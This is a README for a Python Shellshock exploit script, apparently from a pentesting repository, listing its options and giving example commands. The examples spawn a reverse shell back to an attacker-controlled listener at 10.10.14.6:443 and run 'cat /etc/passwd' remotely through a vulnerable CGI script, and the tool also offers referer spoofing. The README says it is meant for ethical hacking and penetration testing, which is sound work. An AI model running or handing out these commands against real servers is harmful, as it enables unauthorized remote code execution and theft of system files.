# Shellshock.py
Python3 shellshock exploit, for ethical hacking/pentesting purposes only. Use it at your own risk. I'm not responsible if you use it with illegal purposes.

<h3>Usage:</h3>

```
-u, --url To specify the target URL (root path), for example: http://example.com
-r, --route-to-cgi To specify the route to the CGI script, for example /cgi-bin/time.sh
-c, --comand To execute remote commands, for example: 'cat /etc/passwd' USE SINGLE QUOTES
-s, --shell To spawn a reverse shell (lhost and lport arguments needed)
-lh, --lhost For specifying your IPv4 to receive the reverse shell, for example: 10.10.14.6
-lp, --lport For specifying the Local Port that you want to use to receive the reverse shell, for example: 443
-to, --timeout The timeout in seconds that you want to set for the HTTP requests, default is 10.
-R, --referer-spoof If you want to use Referer Spoofing, specify a trustable URL, for example: https://www.google.com/search?q=cabecera+referer&oq=cabecera+referer&aqs=chrome..69i57j69i59l2j0l4j69i60.3531j0j7&sourceid=chrome&ie=UTF-8
```

You can do two things with this script, you can receive a shell, or you can execute remote commands

<h3>Example for receiving a shell:</h3>

```
python3 shellshock.py -u http://example.com -r /cgi-bin/time.sh -s -lh 10.10.14.6 -lp 443
```

<h3>Example for executing remote commands:</h3>

```
python3 shellshock.py -u http://example.com -r /cgi-bin/time.sh -c 'cat /etc/passwd'
```
